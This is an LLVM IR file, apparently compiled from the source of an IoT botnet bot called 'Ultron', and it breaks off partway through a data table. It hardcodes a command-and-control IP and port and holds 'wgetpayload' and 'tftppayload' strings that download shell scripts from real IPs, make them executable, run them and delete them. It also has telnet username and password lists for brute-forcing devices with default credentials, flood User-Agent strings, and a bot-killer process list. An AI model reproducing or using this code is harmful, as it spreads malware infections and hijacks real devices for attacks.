; ModuleID = 'host/ir_O3/Ultron.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }

@UserAgents = local_unnamed_addr global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.36, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.2 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.3 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.4 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.5 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.6 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.7 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.8 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.9 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.10 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.11 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.12 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.14 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.15 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.16 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.17 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.18 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.19 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.21 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.22 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.23 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.24 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.25 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.26 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.27 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.28 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.29 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.30 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.31 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.32 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.33 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.34 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.35 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.36 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.37, i32 0, i32 0)], align 8
@.str.37 = private unnamed_addr constant [15 x i8] c"168.235.82.217\00", align 1
@port = local_unnamed_addr global i32 443, align 4
@wgetpayload = local_unnamed_addr global i8* getelementptr inbounds ([221 x i8], [221 x i8]* @.str.38, i64 0, i64 0), align 8
@.str.38 = private unnamed_addr constant [221 x i8] c"cd /var/;wget http://168.235.82.217/sh.sh;chmod 777 sh.sh;sh sh.sh;rm -rf sh.sh;tftp -g 168.235.82.217 -r ab.sh;chmod 777 ab.sh;sh ab.sh;rm -rf ab.sh;tftp 168.235.82.217 -c get ac.sh;chmod 777 ac.sh;sh ac.sh;rm -rf ac.sh\00", align 1
@tftppayload = local_unnamed_addr global i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.39, i64 0, i64 0), align 8
@.str.39 = private unnamed_addr constant [111 x i8] c"cd /tmp; /bin/busybox tftp -g -l aiSHxd -r ab.sh 213.183.53.177; /bin/busybox chmod 777 aiSHxd; sh /tmp/aiSHxd\00", align 1
@lynxpayload = local_unnamed_addr global i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i64 0, i64 0), align 8
@.str.40 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@Telnet_Usernames = local_unnamed_addr global [19 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0)], align 16
@.str.41 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.42 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.43 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.44 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.46 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.47 = private unnamed_addr constant [10 x i8] c"support\00\00\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.49 = private unnamed_addr constant [7 x i8] c"CISCO\00\00", align 1
@.str.50 = private unnamed_addr constant [8 x i8] c"oracle\00\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"tim\00\00", align 1
@Telnet_Passwords = local_unnamed_addr global [19 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0)], align 16
@.str.52 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.53 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.56 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.58 = private unnamed_addr constant [9 x i8] c"netgear1\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.61 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"\00CISCO\00\00", align 1
@Bot_Killer_Binarys = local_unnamed_addr global [176 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.204, i32 0, i32 0), i8* 